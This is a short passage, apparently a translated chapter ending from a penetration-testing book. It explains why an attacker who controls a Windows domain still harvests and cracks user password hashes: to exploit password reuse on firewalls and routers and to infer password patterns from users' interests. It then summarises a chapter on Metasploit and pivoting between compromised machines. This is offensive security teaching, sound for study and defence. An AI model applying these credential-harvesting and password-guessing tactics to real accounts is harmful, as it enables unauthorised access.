有人可能会问，“如果您在域上拥有命令，为什么要收集用户哈希？”许多网络设备没有绑定到域，出于安全原因，不应该绑定到域控制器。防火墙、路由器等应具有独立于域帐户的登录。人们经常在网络上使用相同的密码，甚至在没有逻辑连接到域帐户列表的机器上也是如此。您破解的其中一个密码很可能在其他未绑定到域的计算机上工作。此外，即使密码不起作用，您也可以了解网络用户是如何根据喜好或爱好构建密码的。诸如`FalconsGoGo!`之类的密码可能导致另一台机器上的密码，例如另一台设备上的`RaidersSux!`。很明显，通过查看第一个密码，我们可以猜出此人对足球感兴趣。线索！

像这样的一点点信息，乍一看似乎毫无用处，当与网络上的其他信息结合在一起时，可能会透露出很多信息。在一个重要的黑客工具中了解用户的想法。能够收集信息并然后分析这些信息是优秀黑客和伟大黑客之间的区别。能够像你攻击的人那样思考是最大的利用工具。你拥有的最强大的系统是你耳朵之间的系统。

# 总结

在本章中，您学习了如何入侵 Windows 计算机，以及如何从一个被攻击的系统转移到另一个被攻击的系统。Metasploit 是一个复杂的系统，但是通过实践，您应该能够超越我们在这里向您展示的内容。在 Windows 网络中默认关闭 NetBIOS 可能需要几年的时间，因此此模型的一个变体应该在相当长的一段时间内继续有用。

在下一章中，我们将讨论如何利用 Windows 服务器上的 web 应用程序。